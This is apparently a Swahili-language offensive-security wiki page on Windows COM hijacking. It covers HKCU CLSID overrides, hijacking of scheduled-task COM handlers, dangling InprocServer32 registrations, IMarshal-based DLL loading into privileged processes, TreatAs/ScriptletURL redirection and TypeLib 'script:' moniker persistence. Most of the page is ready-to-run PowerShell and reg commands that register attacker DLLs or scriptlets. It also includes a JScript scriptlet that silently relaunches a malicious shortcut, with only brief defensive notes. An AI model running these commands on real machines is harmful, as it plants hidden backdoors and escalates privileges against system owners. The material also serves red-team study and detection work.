# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta vipengele vya COM ambavyo havipo

Kwa kuwa watumiaji wanaweza kurekebisha thamani za HKCU, **COM Hijacking** inaweza kutumika kama **utaratibu wa persistence**. Kwa kutumia `procmon`, ni rahisi kupata registries za COM zinazotafutwa lakini bado hazipo, na ambazo mshambuliaji anaweza kuunda. Vichujio vya kawaida:

- Operesheni za **RegOpenKey**.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia kwa **InprocServer32**.

Tofauti muhimu unapotafuta:

- Tafuta pia funguo za **`LocalServer32`** ambazo hazipo. Baadhi ya madarasa ya COM ni seva za nje ya mchakato na zitazindua EXE inayodhibitiwa na mshambuliaji badala ya DLL.
- Tafuta operesheni za registry za **`TreatAs`** na **`ScriptletURL`** pamoja na `InprocServer32`. Maudhui ya hivi karibuni ya utambuzi na maandishi kuhusu malware yanaendelea kuyataja haya kwa sababu ni nadra zaidi kuliko usajili wa kawaida wa COM, hivyo yana ishara ya juu zaidi.
- Nakili **`ThreadingModel`** halali kutoka `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` unapounda nakala ya usajili katika HKCU. Kutumia modeli isiyo sahihi mara nyingi huvuruga uanzishaji na kufanya hijack iwe rahisi kugundulika.<sup>[[3]](#references)</sup>
- Kwenye mifumo ya 64-bit, kagua mwonekano wa 64-bit na 32-bit (`procmon.exe` dhidi ya `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu programu za 32-bit zinaweza kutatua usajili tofauti wa COM.

Baada ya kuamua ni COM ipi isiyokuwepo utakayoiiga, tekeleza amri zifuatazo. _Kuwa mwangalifu ukiamua kuiga COM inayopakiwa kila baada ya sekunde chache, kwa kuwa kufanya hivyo kunaweza kuwa kupita kiasi._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa nyara

Windows Tasks hutumia Custom Triggers kuita vitu vya COM, na kwa kuwa vinaendeshwa kupitia Task Scheduler, ni rahisi zaidi kutabiri wakati vitakapoanzishwa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia**, kwa mfano.

Sasa ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utagundua kuwa thamani hiyo haipo katika HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Kisha, unaweza tu kuunda ingizo la HKCU, na kila mtumiaji anapoingia, backdoor yako itawashwa.

## Usajili wa COM Ulioachwa na Custom Marshaling

Usajili wa COM wa mashine nzima unaweza kuwa primitive ya kupanda DLL bila kubadilisha registry. Tafuta thamani ya `InprocServer32` ambayo DLL yake haipo na njia yake ya mwisho inaweza kuundwa au kurekebishwa na mtumiaji mwenye ruhusa za chini. Kuweka DLL yenye jina halisi kutasababisha mchakato wowote unaowasha CLSID kupakia msimbo wa mshambuliaji. Katika mfano wa CrossDevice, njia iliyosajiliwa ilikuwa `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, kwa hiyo mtumiaji wa kawaida angeweza kuunda saraka ndogo iliyokosekana na DLL.<sup>[[5]](#references)</sup>

### Ramani za plugin zinazoweza kuandikwa kama njia za kuwasha COM zenye upendeleo

Ramani ya plugin-ID-to-CLSID inayoweza kuandikwa inaweza kumruhusu mtumiaji mwenye ruhusa za chini kuchagua ni seva ipi ya COM ya ndani ya mchakato itakayopakiwa na huduma yenye upendeleo, hata kama usajili wa mashine nzima wa darasa hilo hauwezi kuhaririwa.<sup>[[8]](#references)[[9]](#references)</sup> Katika hali iliyoripotiwa ya `InstallService` kwenye Windows 11, watumiaji wa kawaida wangeweza kurekebisha `StaticPluginMap`; kitambulisho cha plugin kisichojengewa ndani kilichagua CLSID ambayo huduma ya `LocalSystem` iliipitisha kwa `CoCreateInstance` ikiwa na `CLSCTX_INPROC_SERVER` na `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> DLL iliyosajiliwa hupakiwa ndani ya mchakato wa huduma badala ya host tofauti ya COM.<sup>[[10]](#references)</sup>

Masharti husika ni uwezo halisi wa kuandika kwenye ramani, ombi la plugin linaloweza kufikiwa, na njia ya DLL ya `InprocServer32` ambayo mtumiaji mwenye ruhusa za chini anaweza kuidhibiti.<sup>[[8]](#references)[[9]](#references)</sup> Usajili wa CrossDevice ulioelezwa hapo juu ulitimiza sharti la njia katika hali iliyoripotiwa.<sup>[[8]](#references)[[9]](#references)</sup> Kitu cha plugin kinachofanikiwa lazima kiweke wazi interface iliyoombwa, lakini DLL hupakiwa kabla ya `CoCreateInstance` kukamilika; kushindwa kuweka wazi interface hiyo hakuzuii moja kwa moja utekelezaji wa msimbo wakati wa kupakia.<sup>[[8]](#references)[[11]](#references)</sup> Njia hii ya kuelekeza kupitia huduma ni tofauti na njia ya custom-`IMarshal` iliyo hapa chini. Kwa primitive tofauti ya njia ya faili, tazama [DLL Hijacking](dll-hijacking/).

### `IMarshal` kama primitive ya kupakia DLL katika michakato tofauti

Kwa kawaida, COM huwakilisha pointer ya interface kwa kutumia `OBJREF` ya kawaida inayoelekeza mpokeaji kurudi kwenye kitu asili. Kitu kinachotekeleza `IMarshal` kinaweza badala yake kutoa `OBJREF` maalum. Mbinu yake ya `GetUnmarshalClass` hutoa CLSID ya msimbo utakaounda upya kitu katika mchakato unaopokea. CLSID hiyo haihitaji kutambulisha kitu asili. COM huitafuta kama seva ya ndani ya mchakato na kupakia DLL iliyosajiliwa kabla ya kuelekeza mwito wa mbinu ya interface iliyoombwa.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Utekelezaji hasidi wa kiwango cha chini unahitaji tu kubadilisha CLSID iliyoachwa ndani ya `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Tuma object hii kupitia parameter ya method ya proxied kama `[in] IUnknown *`. Chaguo jingine ni `CoGetInstanceFromIStorage`, ambapo object ya custom-marshaled pia inatekeleza `IStorage` kwa kiwango kinachotosha kupita ukaguzi wa ndani. Unmarshaling ya kiotomatiki kwenye remote server hutatua CLSID iliyobadilishwa, kwa hivyo DLL hupakiwa kabla method lengwa haijatekelezwa.<sup>[[5]](#references)</sup>

Primitive hii haiishii kwenye registrations zinazokosekana. Inaweza pia kulazimisha receiver kupakia DLL iliyopo ya custom-unmarshaler na kufichua bugs katika njia yake ya upakiaji au unmarshaling.<sup>[[5]](#references)</sup>

Chain hii inahitaji masharti yote yafuatayo:<sup>[[5]](#references)</sup>

1. CLSID inayoonekana kwa mashine inaelekeza kwenye DLL ya in-process inayokosekana au inayoweza kubadilishwa.
2. Attacker anaweza kuweka DLL hiyo kwenye path iliyotatuliwa.
3. COM server ya out-of-process inayoweza kuamilishwa inaendeshwa kwa kiwango cha privilege kinachotakiwa.
4. Server inakubali custom marshaling na kufichua call ya proxied inayosafirisha object ya attacker kuvuka mpaka wa process.

### Tafuta in-process servers zilizoning'inia

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) na [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) zinaweza kuorodhesha machine COM database na kujaribu kila server kupitia module resolution ya kawaida ya Win32. Hii ni bora kuliko `Test-Path` kwa sababu baadhi ya registrations zina filename pekee na hutegemea loader search path.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Chukulia matokeo kama orodha ya watahiniwa, si uthibitisho wa uwezekano wa kutumia dosari. Tatua njia kama loader anavyofanya, kisha kagua DACL kwenye mzazi wa kwanza uliopo na kwenye DLL lengwa ikiwa tayari ipo. Faili inayokosekana ina manufaa tu ikiwa mshambulizi anaweza kuunda au kubadilisha njia ambayo COM itatatua kwa hakika.<sup>[[5]](#references)</sup>

### Chagua na uanzishe kipokezi chenye ruhusa za juu

Kagua madarasa ya COM yanayoweza kufaa ili kupata `RunAs`, uhusiano na huduma, interfaces zinazopatikana na RPC proxies. Darasa lililowekwa kuendeshwa kama `SYSTEM` lakini lisilohusishwa na huduma yenye jina huenda likashindwa kuwashwa moja kwa moja kwa sababu RPCSS haiwezi kulianzisha. Katika hali hiyo, tafuta kichochezi kisicho na ruhusa za juu kinachoanzisha host yake, kama vile kazi iliyopangwa inayoweza kutekelezwa na mtumiaji, kisha tekeleza tena sharti lolote la named-event au IPC linalofanya server iendelee kufanya kazi.<sup>[[5]](#references)</sup>

Kwa mfano, mnyororo wa Shell Create Object Handler uliokuwa na dosari ulianzisha host yake kwa kuunda global event iliyotarajiwa kabla ya kuendesha kazi iliyopangwa inayoweza kutekelezwa na mtumiaji.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Fuatilia object reference inayopatikana hadi kwenye host yake na uthibitishe utambulisho pamoja na sera ya marshaling. Kisha orodhesha interfaces na ubadilishe proxies zake kuwa IDL ili kupata parameter ya ingizo kama `IUnknown *` ambayo itafanya fake object ipitie marshaling.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Protections dhidi ya custom-marshaling

Receiver anayefaa hapaswi kukataa custom marshalers zisizoaminika. Protections mbili za kiwango cha process ni `EOAC_NO_CUSTOM_MARSHAL` katika capabilities zinazopitishwa kwa `CoInitializeSecurity` na `COMGLB_UNMARSHALING_POLICY_STRONG` inayowekwa kupitia `IGlobalOptions::Set`. Ukiwa na symbols, hali inayolingana inaweza kukaguliwa katika `combase!gCapabilities` na `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager huonyesha matokeo kama `CustomMarshalAllowed` pale parser yake ya process inapounga mkono build ya Windows husika.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` huruhusu CLSID moja kuigwa na CLSID nyingine.<sup>[[4]](#references)</sup> Kwa mtazamo wa kiutendaji, hii inamaanisha unaweza kuacha CLSID ya awali bila kuigusa, kuunda CLSID ya pili ya kila mtumiaji inayoelekeza kwenye `scrobj.dll`, kisha kuelekeza upya COM object halisi kwenye ile hasidi kupitia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Hii ni muhimu wakati:

- programu lengwa tayari huanzisha CLSID thabiti wakati wa kuingia au inapoanza
- unataka kuelekeza upya kwa kutumia registry pekee badala ya kubadilisha `InprocServer32` ya awali
- unataka kutekeleza scriptlet ya `.sct` ya ndani au ya mbali kupitia thamani ya `ScriptletURL`

Mfano wa mtiririko wa kazi (uliorekebishwa kutoka tradecraft ya umma ya Atomic Red Team na utafiti wa zamani kuhusu matumizi mabaya ya COM registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Maelezo:

- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` iliyorejelewa, kwa hivyo unaweza kuhifadhi payload kama faili la ndani au kuipakua kupitia HTTP/HTTPS.
- `TreatAs` inafaa hasa wakati usajili wa awali wa COM umekamilika na ni thabiti katika HKLM, kwa sababu unahitaji tu kuelekeza upya kwa kiwango kidogo cha kila mtumiaji badala ya kuakisi mti mzima.
- Ili kuthibitisha bila kusubiri kichochezi cha kawaida, unaweza kuanzisha ProgID/CLSID bandia wewe mwenyewe kwa kutumia `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa class lengwa inakubali uanzishaji wa STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) hufafanua interfaces za COM na hupakiwa kupitia `LoadTypeLib()`. Wakati COM server inapozinduliwa, mfumo wa uendeshaji unaweza pia kupakia TypeLib inayohusishwa kwa kuangalia funguo za registry chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa na kuwa **moniker**, kwa mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet TypeLib itakapotatuliwa — na hivyo kutoa persistence fiche inayowashwa wakati components zinazotumika mara kwa mara zinapotumiwa.

Hili limeonekana likitumiwa dhidi ya Microsoft Web Browser control (ambayo hupakiwa mara nyingi na Internet Explorer, programu zinazopachika WebBrowser, na hata `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Hatua (PowerShell)

1) Tambua TypeLib (LIBID) inayotumiwa na CLSID yenye matumizi ya mara kwa mara. Mfano wa CLSID unaotumiwa vibaya mara nyingi katika minyororo ya malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Elekeza njia ya TypeLib ya kila mtumiaji kwenye scriptlet ya ndani kwa kutumia moniker ya `script:` (hakuna haki za admin zinazohitajika):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Weka JScript `.sct` ndogo kabisa inayowasha tena payload yako kuu (kwa mfano, `.lnk` iliyotumika kwenye chain ya awali):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Kuanzisha – kufungua IE, programu inayopachika WebBrowser control, au hata shughuli za kawaida za Explorer kutapakia TypeLib na kutekeleza scriptlet, na kuwasha upya mnyororo wako kila unapoingia au kuwasha upya kompyuta.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- Unaweza kutumia mantiki hiyo hiyo kwa vipengele vingine vya COM vinavyotumiwa mara nyingi; kwanza pata `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib`.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## References

- [1] [Tekeleza utekaji wa TypeLib – Mbinu mpya ya persistence ya COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Utafiti wa Check Point – Kampeni ya ZipLine: Shambulio tata la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Kuchunguza upya Utekaji wa COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Ufunguo wa CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Mbinu za Kutumia Udhaifu wa Windows: Usajili wa COM Object Zinazoning'inia](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Kiolesura cha IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Maelezo ya Microsoft Open - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC ya Dark Elevator na maelezo ya kiufundi (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Kupandisha Haki za Ndani kupitia Huduma ya Usakinishaji ya Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Orodha ya CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Function ya CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

